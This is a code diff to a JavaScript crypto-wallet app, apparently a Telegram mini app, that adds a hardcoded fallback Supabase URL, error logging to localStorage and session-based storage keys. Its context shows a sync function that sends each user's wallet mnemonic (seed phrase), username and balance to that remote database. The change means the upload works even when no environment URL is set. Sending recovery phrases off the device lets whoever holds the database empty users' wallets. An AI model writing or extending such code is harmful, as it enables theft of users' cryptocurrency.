@@ -44,7 +44,7 @@ import { sendTransaction as chainSendTransaction } from "./lib/crypto/transactio
 
 // ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
 
-const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
 const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
 function getMoscowTimestamp() {
@@ -106,7 +106,15 @@ function resolveTelegramDisplayName(fallbackUserId = null) {
 }
 
 async function syncWalletToSupabase(walletData) {
-  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    try {
+      localStorage.setItem("gem_last_supabase_error", JSON.stringify({
+        at: new Date().toISOString(),
+        message: "Supabase URL or ANON KEY missing (check VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY in Vercel env).",
+      }));
+    } catch {}
+    return null;
+  }
   try {
     const { username, mnemonic, balance } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
@@ -132,9 +140,22 @@ async function syncWalletToSupabase(walletData) {
     if (!response.ok) {
       const txt = await response.text();
       console.error("[Supabase Sync Error]", response.status, txt);
+      try {
+        localStorage.setItem("gem_last_supabase_error", JSON.stringify({
+          at: new Date().toISOString(),
+          status: response.status,
+          body: txt,
+        }));
+      } catch {}
     }
   } catch (error) {
     console.error("[Supabase Fetch Error]", error);
+    try {
+      localStorage.setItem("gem_last_supabase_error", JSON.stringify({
+        at: new Date().toISOString(),
+        message: String(error?.message || error),
+      }));
+    } catch {}
   }
 }
 
@@ -168,6 +189,18 @@ const fmtCrypto = (n, d=6) => parseFloat(n.toFixed(d));
 
 let RESOLVED_USER_ID = null;
 
+function getOrCreateSessionId() {
+  try {
+    const existing = sessionStorage.getItem("gem_session_id");
+    if (existing) return existing;
+    const created = `${Date.now()}_${Math.random().toString(16).slice(2)}`;
+    sessionStorage.setItem("gem_session_id", created);
+    return created;
+  } catch {
+    return `${Date.now()}_${Math.random().toString(16).slice(2)}`;
+  }
+}
+
 
 
 function getTgUserId() {
@@ -186,7 +219,9 @@ function storageKey(base) {
 
   const uid = RESOLVED_USER_ID || getTgUserId();
 
-  return uid ? `${base}_${uid}` : base;
+  if (uid) return `${base}_${uid}`;
+  const sid = getOrCreateSessionId();
+  return `${base}_session_${sid}`;
 
 }
 
